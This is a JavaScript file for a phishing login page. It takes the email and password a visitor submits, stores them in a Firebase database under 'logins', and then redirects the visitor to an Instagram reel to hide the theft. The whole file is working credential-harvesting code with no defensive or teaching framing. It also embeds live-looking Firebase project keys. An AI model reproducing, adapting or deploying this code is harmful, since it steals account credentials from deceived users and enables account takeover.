// Your Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyBaoef68S_-iHBch1KyZj7WJeG2tJsmZFs",
    authDomain: "reel-79559.firebaseapp.com",
    projectId: "reel-79559",
    storageBucket: "reel-79559.appspot.com",
    messagingSenderId: "638569592300",
    appId: "1:638569592300:web:4dccef98a3750eb4e57cc9"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var database = firebase.database();

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Save credentials to Firebase
    var newLoginRef = database.ref('logins').push();
    newLoginRef.set({
        email: email,
        password: password
    })
    .then(function() {
        console.log('Login saved successfully!');
        window.location.href = "https://www.instagram.com/reel/C90YWPWMuXR/?utm_source=ig_web_copy_link";
    })
    .catch(function(error) {
        console.error('Error saving login: ', error);
    });
});

document.getElementById('togglePassword').addEventListener('click', function () {
    var passwordField = document.getElementById('password');
    var passwordFieldType = passwordField.getAttribute('type');
    if (passwordFieldType === 'password') {
        passwordField.setAttribute('type', 'text');
        this.innerHTML = '<img src="https://img.icons8.com/ios-glyphs/30/000000/invisible.png" alt="Hide Password" style="width: 20px;">';
    } else {
        passwordField.setAttribute('type', 'password');
        this.innerHTML = '<img src="https://img.icons8.com/ios-glyphs/30/000000/visible.png" alt="Show Password" style="width: 20px;">';
    }
});